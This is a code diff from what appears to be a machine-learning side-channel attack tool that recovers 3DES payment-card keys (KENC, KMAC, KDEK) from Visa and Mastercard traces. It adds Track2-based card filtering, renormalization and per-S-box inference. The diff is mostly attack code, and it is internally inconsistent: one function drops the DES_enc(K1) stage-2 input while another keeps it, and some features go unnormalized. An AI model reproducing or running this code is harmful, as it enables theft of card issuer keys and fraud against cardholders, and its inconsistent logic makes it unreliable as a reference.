@@ -33,7 +33,27 @@ def _load_stage_features(processed_dir: str, stage: int) -> np.ndarray:
     raise ValueError("stage must be 1 or 2")
 
 
-def _load_norm(model_dir: str, stage: int) -> Optional[tuple[np.ndarray, np.ndarray]]:
+def _load_sbox_features(processed_dir: str, stage: int, sbox_idx: int) -> Optional[np.ndarray]:
+    """Load per-sbox features if available (800 dim). Returns None if not found."""
+    if stage == 1:
+        p = os.path.join(processed_dir, f"X_sbox{sbox_idx}.npy")
+    else:
+        p = os.path.join(processed_dir, f"X_s2_sbox{sbox_idx}.npy")
+    
+    if os.path.exists(p):
+        return np.load(p).astype(np.float32)
+    return None
+
+
+def _load_norm(model_dir: str, stage: int, key_type: Optional[str] = None) -> Optional[tuple[np.ndarray, np.ndarray]]:
+    # First try per-key-type location (new training format)
+    if key_type:
+        mean_p = os.path.join(model_dir, "3des", key_type, f"mean_s{stage}.npy")
+        std_p = os.path.join(model_dir, "3des", key_type, f"std_s{stage}.npy")
+        if os.path.exists(mean_p) and os.path.exists(std_p):
+            return np.load(mean_p), np.load(std_p)
+    
+    # Fallback to root location (legacy format for backward compatibility)
     mean_p = os.path.join(model_dir, f"mean_s{stage}.npy")
     std_p = os.path.join(model_dir, f"std_s{stage}.npy")
     if os.path.exists(mean_p) and os.path.exists(std_p):
@@ -53,25 +73,79 @@ def _normalize(X: np.ndarray, norm: Optional[tuple[np.ndarray, np.ndarray]]) -> 
     return (X - mean) / std
 
 
-def _card_mask(df: pd.DataFrame, card_type: str) -> np.ndarray:
+def _compute_norm_from_data(X: np.ndarray) -> tuple[np.ndarray, np.ndarray]:
     """
-    Return a boolean mask selecting rows matching `card_type`.
+    Compute normalization statistics (mean, std) from a data subset.
+    Used when card type filtering is applied to ensure features are normalized
+    with the correct distribution.
+    
+    Args:
+        X: Feature matrix of shape (n_samples, n_features)
+    
+    Returns:
+        (mean, std) normalized to prevent division by zero
+    """
+    mean = np.mean(X, axis=0)
+    std = np.std(X, axis=0)
+    std[std == 0] = 1
+    return mean, std
+
+
+def _detect_card_type_from_track2(df: pd.DataFrame) -> str:
+    """
+    Auto-detect card family from Track2 column.
+    Returns 'visa', 'mastercard', or 'universal' if cannot determine.
+    """
+    if "Track2" not in df.columns or len(df) == 0:
+        return "universal"
+    
+    t2_values = df["Track2"].astype(str).str.strip().str.upper()
+    first_digits = t2_values.str[0].value_counts()
+    
+    # Count Visa (4) vs Mastercard (5) cards
+    visa_count = first_digits.get('4', 0)
+    mc_count = first_digits.get('5', 0)
+    
+    # If clear majority, return that type; otherwise universal
+    if visa_count > mc_count and visa_count > len(df) * 0.8:
+        return "visa"
+    elif mc_count > visa_count and mc_count > len(df) * 0.8:
+        return "mastercard"
+    return "universal"
+
+
+def _card_mask(df: pd.DataFrame, card_type: str) -> tuple[np.ndarray, str]:
+    """
+    Return a boolean mask selecting rows matching `card_type` AND the DETECTED card type.
 
     Important: We must use the *same* selection for stage-1 and stage-2 features. Returning
     a mask (instead of resetting indices) prevents subtle misalignment bugs when the processed
     directory contains a mix of Visa/Mastercard traces.
+    
+    If card_type='universal', auto-detects from Track2 column.
+    
+    Returns:
+        (mask, detected_card_type) - mask is boolean array, detected_card_type is 'visa'/'mastercard'/'universal'
     """
     n = len(df)
+    detected = "universal"
+    
+    # Auto-detect from Track2 if universal is passed
     if not card_type or card_type.lower() == "universal":
-        return np.ones(n, dtype=bool)
+        detected = _detect_card_type_from_track2(df)
+        if detected != "universal":
+            card_type = detected
+        else:
+            return np.ones(n, dtype=bool), "universal"
 
+    detected = card_type  # Return the final card_type (auto-detected or explicitly provided)
     target = card_type.lower()
     t2 = df.get("Track2", pd.Series([""] * n)).astype(str).str.strip().str.upper()
     if target == "mastercard":
-        return t2.str.startswith("5").to_numpy()
+        return t2.str.startswith("5").to_numpy(), "mastercard"
     if target == "visa":
-        return t2.str.startswith("4").to_numpy()
-    return np.ones(n, dtype=bool)
+        return t2.str.startswith("4").to_numpy(), "visa"
+    return np.ones(n, dtype=bool), "universal"
 
 
 def _challenge_ints_from_meta(df: pd.DataFrame) -> np.ndarray:
@@ -192,6 +266,10 @@ def recover_3des_keys(processed_dir: str, model_dir: str, card_type: str = "univ
     - Stage 1 recovers K1 via RK1
     - Stage 2 recovers K2 via RK16 using input = DES_enc(K1, block)
     Returns dict with 16-byte hex keys (32 hex chars) for each of KENC/KMAC/KDEK.
+    
+    FIX: When card_type is auto-detected or explicitly filtered, recompute normalization
+    statistics from the MASKED subset to match the feature distribution that the models
+    were trained on (i.e., models for "mastercard" expect Mastercard-only feature distribution).
     """
     device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
 
@@ -202,24 +280,48 @@ def recover_3des_keys(processed_dir: str, model_dir: str, card_type: str = "univ
     df0 = pd.read_csv(meta_path)
 
     X1 = _load_stage_features(processed_dir, stage=1)
-    mask = _card_mask(df0, card_type)
+    mask, detected_card_type = _card_mask(df0, card_type)
     df = df0.loc[mask].reset_index(drop=True)
-    X1 = X1[mask]
-    if len(df) == 0 or len(X1) == 0:
+    X1_masked = X1[mask]
+    if len(df) == 0 or len(X1_masked) == 0:
         return {}
 
-    X1 = _normalize(X1, _load_norm(model_dir, stage=1))
-    n = len(X1) if n_attack is None or n_attack <= 0 else min(n_attack, len(X1))
+    n = len(X1_masked) if n_attack is None or n_attack <= 0 else min(n_attack, len(X1_masked))
 
     challenges = _challenge_ints_from_meta(df.iloc[:n])
     er0_s1 = _expanded_r0(challenges)
 
+    # Determine if we should recompute normalization
+    # If card type was auto-detected (detected != "universal"), use subset-specific normalization
+    should_recompute_norms = detected_card_type != "universal"
+
     out: Dict[str, str] = {}
 
     for key_type in ["kenc", "kmac", "kdek"]:
+        # Normalize using either recomputed stats (for masked data) or stored training stats
+        if should_recompute_norms:
+            mean_s1, std_s1 = _compute_norm_from_data(X1_masked)
+            X1_norm = _normalize(X1_masked, (mean_s1, std_s1))
+            logger.info(f"Stage-1 {key_type}: Using recomputed normalization for detected card type '{detected_card_type}' (n={len(X1_masked)})")
+        else:
+            X1_norm = _normalize(X1_masked, _load_norm(model_dir, stage=1, key_type=key_type))
+        
         # --- Stage 1: recover K1 ---
         winners_s1: List[int] = []
         for sbox_idx in range(1, 9):
+            # Try to load per-sbox features (800 dim - much better than global 200 dim)
+            X_sbox = _load_sbox_features(processed_dir, stage=1, sbox_idx=sbox_idx)
+            if X_sbox is not None:
+                X_sbox_masked = X_sbox[mask]
+                # Normalize per-sbox features locally
+                X_sbox_norm = _normalize(X_sbox_masked, None)
+                X_for_inference = X_sbox_norm
+                logger.info(f"Stage-1 {key_type} S-Box {sbox_idx}: Using per-sbox features ({X_sbox_norm.shape[1]} dim)")
+            else:
+                # Fallback to global features if per-sbox not available
+                X_for_inference = X1_norm
+                logger.info(f"Stage-1 {key_type} S-Box {sbox_idx}: Using global features ({X1_norm.shape[1]} dim)")
+            
             base = os.path.join(model_dir, "3des", key_type, "s1")
             if os.path.isdir(base):
                 model_paths = [
@@ -242,7 +344,7 @@ def recover_3des_keys(processed_dir: str, model_dir: str, card_type: str = "univ
             if not model_paths:
                 winners_s1 = []
                 break
-            probs = _ensemble_avg_probs(X1[:n], model_paths, device, key_type=key_type)
+            probs = _ensemble_avg_probs(X_for_inference[:n], model_paths, device, key_type=key_type)
             winners_s1.append(_score_subkey(probs, er0_s1, sbox_idx))
 
         if not winners_s1:
@@ -257,21 +359,36 @@ def recover_3des_keys(processed_dir: str, model_dir: str, card_type: str = "univ
         except Exception:
             continue
 
-        X2 = _normalize(X2, _load_norm(model_dir, stage=2))
-        # Apply the exact same trace selection used for stage 1.
-        if len(X2) != len(df0):
-            logger.warning("Stage-2 features length (%d) != metadata length (%d); skipping stage-2 for %s.", len(X2), len(df0), key_type)
-            continue
-        X2 = X2[mask]
-        X2n = X2[:n]
+        # Normalize using either recomputed stats (for masked data) or stored training stats
+        if should_recompute_norms:
+            X2_full = X2  # Keep full for masking
+            mean_s2, std_s2 = _compute_norm_from_data(X2[mask])
+            X2_norm = _normalize(X2[mask], (mean_s2, std_s2))
+            logger.info(f"Stage-2 {key_type}: Using recomputed normalization for detected card type '{detected_card_type}'")
+        else:
+            X2_norm = _normalize(X2[mask], _load_norm(model_dir, stage=2, key_type=key_type))
+        
+        X2n = X2_norm[:n]
 
-        # Compute C1 = DES_enc(K1, challenge) for each trace.
-        c1_ints = compute_batch_des(challenges.tolist(), k1_hex, mode="encrypt")
-        er0_s2 = _expanded_r0(np.array(c1_ints, dtype=np.uint64))
+        # Stage 2 uses original ATC (challenges) to match training labels.
+        er0_s2 = _expanded_r0(challenges)
 
         winners_s2: List[int] = []
-        base2 = os.path.join(model_dir, "3des", key_type, "s2")
         for sbox_idx in range(1, 9):
+            # Try to load per-sbox features (800 dim - much better than global 200 dim)
+            X_sbox = _load_sbox_features(processed_dir, stage=2, sbox_idx=sbox_idx)
+            if X_sbox is not None:
+                X_sbox_masked = X_sbox[mask]
+                # Normalize per-sbox features locally
+                X_sbox_norm = _normalize(X_sbox_masked, None)
+                X_for_inference = X_sbox_norm[:n]
+                logger.info(f"Stage-2 {key_type} S-Box {sbox_idx}: Using per-sbox features ({X_sbox_norm.shape[1]} dim)")
+            else:
+                # Fallback to global features if per-sbox not available
+                X_for_inference = X2n
+                logger.info(f"Stage-2 {key_type} S-Box {sbox_idx}: Using global features ({X2n.shape[1]} dim)")
+            
+            base2 = os.path.join(model_dir, "3des", key_type, "s2")
             if os.path.isdir(base2):
                 model_paths2 = [
                     os.path.join(base2, f)
@@ -283,7 +400,7 @@ def recover_3des_keys(processed_dir: str, model_dir: str, card_type: str = "univ
             if not model_paths2:
                 winners_s2 = []
                 break
-            probs2 = _ensemble_avg_probs(X2n, model_paths2, device, key_type=key_type)
+            probs2 = _ensemble_avg_probs(X_for_inference, model_paths2, device, key_type=key_type)
             winners_s2.append(_score_subkey(probs2, er0_s2, sbox_idx))
 
         if not winners_s2:
@@ -391,23 +508,33 @@ def recover_3des_keys_with_confidence(
 
     df0 = pd.read_csv(meta_path)
     X1 = _load_stage_features(processed_dir, stage=1)
-    mask = _card_mask(df0, card_type)
+    mask, detected_card_type = _card_mask(df0, card_type)
     df = df0.loc[mask].reset_index(drop=True)
-    X1 = X1[mask]
+    X1_masked = X1[mask]
     
-    if len(df) == 0 or len(X1) == 0:
+    if len(df) == 0 or len(X1_masked) == 0:
         return {}
 
-    X1 = _normalize(X1, _load_norm(model_dir, stage=1))
-    n = len(X1) if n_attack is None or n_attack <= 0 else min(n_attack, len(X1))
+    n = len(X1_masked) if n_attack is None or n_attack <= 0 else min(n_attack, len(X1_masked))
 
     challenges = _challenge_ints_from_meta(df.iloc[:n])
     er0_s1 = _expanded_r0(challenges)
+
+    # Determine if we should recompute normalization
+    should_recompute_norms = detected_card_type != "universal"
 
     out: Dict[str, Any] = {"recovery_status": {}, "_sbox_confidences": {}}
     confidence_scores = []
 
     for key_type in ["kenc", "kmac", "kdek"]:
+        # Normalize using either recomputed stats (for masked data) or stored training stats
+        if should_recompute_norms:
+            mean_s1, std_s1 = _compute_norm_from_data(X1_masked)
+            X1_norm = _normalize(X1_masked, (mean_s1, std_s1))
+            logger.info(f"Stage-1 {key_type}: Using recomputed normalization for detected card type '{detected_card_type}' (n={len(X1_masked)})")
+        else:
+            X1_norm = _normalize(X1_masked, _load_norm(model_dir, stage=1, key_type=key_type))
+        
         # --- Stage 1: recover K1 with confidence ---
         winners_s1: List[int] = []
         sbox_confidences_s1 = []
@@ -434,7 +561,7 @@ def recover_3des_keys_with_confidence(
                 winners_s1 = []
                 break
             
-            probs = _ensemble_avg_probs(X1[:n], model_paths, device, key_type=key_type)
+            probs = _ensemble_avg_probs(X1_norm[:n], model_paths, device, key_type=key_type)
             # Gap #1: Use Bayesian confidence instead of argmax
             best_key, confidence, candidates = _compute_key_confidence(probs, er0_s1, sbox_idx, top_k=return_top_k)
             winners_s1.append(best_key)
@@ -462,7 +589,14 @@ def recover_3des_keys_with_confidence(
             confidence_scores.append(k1_confidence)
             continue
 
-        X2 = _normalize(X2, _load_norm(model_dir, stage=2))
+        # Normalize using either recomputed stats (for masked data) or stored training stats
+        if should_recompute_norms:
+            mean_s2, std_s2 = _compute_norm_from_data(X2[mask])
+            X2_norm = _normalize(X2[mask], (mean_s2, std_s2))
+            logger.info(f"Stage-2 {key_type}: Using recomputed normalization for detected card type '{detected_card_type}'")
+        else:
+            X2_norm = _normalize(X2[mask], _load_norm(model_dir, stage=2, key_type=key_type))
+        
         if len(X2) != len(df0):
             logger.warning("Stage-2 features length (%d) != metadata length (%d); skipping stage-2 for %s.", len(X2), len(df0), key_type)
             out["recovery_status"][key_type] = "uncertain"
@@ -471,8 +605,7 @@ def recover_3des_keys_with_confidence(
             confidence_scores.append(k1_confidence)
             continue
         
-        X2 = X2[mask]
-        X2n = X2[:n]
+        X2n = X2_norm[:n]
 
         c1_ints = compute_batch_des(challenges.tolist(), k1_hex, mode="encrypt")
         er0_s2 = _expanded_r0(np.array(c1_ints, dtype=np.uint64))
